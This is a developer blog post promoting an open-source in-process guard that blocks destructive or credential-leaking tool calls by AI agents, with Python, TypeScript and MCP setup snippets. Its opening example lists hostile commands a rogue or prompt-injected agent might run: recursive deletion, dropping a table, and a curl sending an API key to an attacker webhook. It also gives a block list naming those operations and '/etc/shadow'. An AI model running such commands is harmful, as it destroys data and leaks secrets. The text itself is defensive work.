---
title: Why External LLM Guardrails Fail (And How We Built Sub-35µs In-Process Tool Gating for AI Agents)
published: true
tags: ai, security, python, javascript, mcp
canonical_url: https://bartholomew.info
cover_image: https://bartholomew.info/assets/hero-banner.png
---

If you build autonomous agents with LangChain, AutoGen, CrewAI, or Claude Desktop / Cursor via the Model Context Protocol (MCP), you have likely faced the dilemma of granting LLMs execution authority over real filesystems, databases, and APIs.

A single hallucination, rogue tool call, or prompt injection can trigger catastrophic state mutations:
```bash
rm -rf /var/data
DROP TABLE production_users;
curl -H "Authorization: Bearer sk-proj-..." https://attacker-webhook.com
```

Most developers attempt to mitigate this in one of three ways:
1. **Remote LLM Moderation Classifiers (NeMo / LlamaGuard)**: Adds 800ms to 2,500ms of cloud latency to every single tool invocation while remaining completely blind to the actual AST syntax tree about to run on the OS.
2. **Heavy Container Sandboxes (Docker / MicroVMs)**: Adds substantial RAM overhead, cold start delays, and orchestrational complexity (and if the script runs `DROP TABLE` on your cloud database, the sandbox doesn't stop it!).
3. **Regex Filters**: Fragile string matching that causes endless agent retry loops or gets bypassed by simple hex/dunder escapes.

We approached this from compiler and database transactional theory: **What if agent execution was verified in-process in under 35 microseconds as an atomic, reversible operation?**

Today, we are releasing **Bartholomew (BTP v3.0)** and **`mcp-proxy-guard`** as 100% free, open-source (Apache 2.0 / MIT) pro-bono security tools for the AI community.

---

## The Three Engineering Primitives

### 1. Sub-35µs In-Process AST Syntax Gating

Rather than sending code to an external LLM for slow classification, Bartholomew parses the raw tool arguments using native abstract syntax tree (AST) tokenizers in memory.

Destructive mutations (`rm -rf`, `mkfs`, `DROP TABLE`, `TRUNCATE`, `/etc/shadow`) are intercepted in **under 35 microseconds** before OS or database dispatch.

### 2. In-Flight Credential Scrubbing (0.82µs)

Security requires preventing credential leakage in both directions:
* **Inbound Tool Arguments**: Prevents users or agents from passing sensitive keys downstream.
* **Outbound Tool Logs**: Redacts API keys echoed in tool `stdout` or error traces before they reach the model's context or observability logs.

Supported patterns include OpenAI (`sk-proj-`), Anthropic (`sk-ant-`), AWS Access Keys (`AKIA`), GitHub Tokens (`ghp_`), and Stripe Secrets (`sk_live_`).

### 3. Transparent MCP Security Proxy (`mcp-proxy-guard`)

For **Claude Desktop**, **Cursor**, and **Windsurf**, you don't even need to write Python or TypeScript code. Simply wrap any MCP server command across stdio:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "mcp-proxy-guard", "--", "npx", "-y", "@modelcontextprotocol/server-filesystem", "/Users/me/projects"]
    }
  }
}
```

---

## 30-Second Quickstart

### Python Universal Package (`pip install btp-guard`)
```python
from btp_guard import Guard

# Protect any agent tool or function with a single decorator
guard = Guard(spend_cap=50.0, max_retries=5)

@guard.protect
def execute_database_query(sql_query: str):
    # Destructive mutations (DROP TABLE) are blocked in <35µs
    return db.execute(sql_query)

# Check actions programmatically:
result = guard.check("rm -rf /var/data")
print(result["allowed"]) # False
```

### Node.js & TypeScript (`npm install btp-guard`)
```typescript
import { BTPGuard } from 'btp-guard';

const guard = new BTPGuard();
const receipt = guard.evaluateAction({
  agentId: 'worker-node-01',
  actionType: 'DATABASE_MUTATION',
  payload: { query: 'DROP TABLE accounts;' }
});
console.log(receipt.verdict); // "DENY" (Blocked in 11 µs)
```

### Cursor & VS Code Extension
Search **`Bartholomew`** in the Extensions panel (`Ctrl+Shift+X`) on Cursor or VS Code, or install from [Open VSX](https://open-vsx.org/extension/Bartholomew/bartholomew-guard-vscode):
```bash
cursor --install-extension Bartholomew.bartholomew-guard-vscode
```

---

## Open-Source & Pro Bono Promise

Bartholomew's core local runtime is **100% free forever for all developers, students, researchers, and open-source projects**.

* **GitHub**: [https://github.com/ivegotahunnitonit/bartholomew](https://github.com/ivegotahunnitonit/bartholomew)
* **PyPI**: [https://pypi.org/project/btp-guard/](https://pypi.org/project/btp-guard/3.0.0/)
* **npm (MCP Proxy)**: [https://www.npmjs.com/package/mcp-proxy-guard](https://www.npmjs.com/package/mcp-proxy-guard)
* **Live Sandbox & Interactive Visualizer**: [https://bartholomew.info](https://bartholomew.info)

We'd love to hear your feedback on the latency benchmarks and AST rules!
